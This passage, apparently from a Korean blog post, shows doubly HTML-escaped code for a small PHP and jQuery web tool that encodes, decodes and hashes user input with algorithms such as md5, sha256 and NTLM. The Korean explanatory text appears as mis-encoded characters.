        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;textarea&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Decode&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Decode&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onkeyup=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DongDongE('decode')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;textarea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;decode_res&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./jquery-3.5.1.min.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
            function DongDongE(mode) &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;index.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#Encode&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#encode_res&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;index.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#Decode&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;#decode_res&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            
                &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
            &lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;
            
        &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;index.html&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ì‚¬ìš©ìê°€ ì…ë ¥ì„ í• ë•Œ ë§ˆë‹¤ ì¦‰ì‹œ ì „ì†¡í•˜ì—¬ ì¸/ë””ì½”ë”© ë° í•´ì‹œí™”ë¥¼ í•˜ì—¬ ê²°ê³¼ê°’ì„ ëŒë ¤ ë°›ìŠµë‹ˆë‹¤. ì´ë•Œ jqueryë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìë¥¼ POSTë¡œ ìš”ì²­í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 
    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./func.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$code&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;   &lt;span class=&quot;cm&quot;&gt;/* encode | decode */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./index.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* Default False */&lt;/span&gt;
    
    &lt;span class=&quot;nv&quot;&gt;$encode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;md4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;md5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
                    &lt;span class=&quot;s2&quot;&gt;&quot;sha1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sha256&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sha384&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sha512&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;NTLMHash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
                    &lt;span class=&quot;s2&quot;&gt;&quot;ripemd128&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ripemd160&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ripemd256&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ripemd320&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;whirlpool&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;tiger128_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tiger160_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tiger192_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tiger128_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tiger160_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tiger192_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;snefru&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;gost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;adler32&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;crc32&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;crc32b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;haval128_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval160_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval192_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval224_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval256_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;haval128_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval160_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval192_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval224_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval256_4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;haval128_5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval160_5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval192_5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval224_5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haval256_5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;base64_en&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;url_en&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;html_en&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;html_entities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rot13_en&quot;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$connvert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str_2_hex&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hex_2_str&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;str_2_hex_2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;str_2_hex_3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;str_2_bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bin_2_str&quot;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$decode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base64_de&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;url_de&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;html_de&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rot13_de&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* hash start - ìì£¼ ì‚¬ìš©ëœ */&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$md2&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$md4&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$md5&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 32&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sha1&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;           &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 40&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sha256&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha256&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 64&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sha384&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha384&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 96&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sha512&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha512&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// 128&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* hash start - ìì£¼ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” */&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$NTLMHash&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NTLMHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
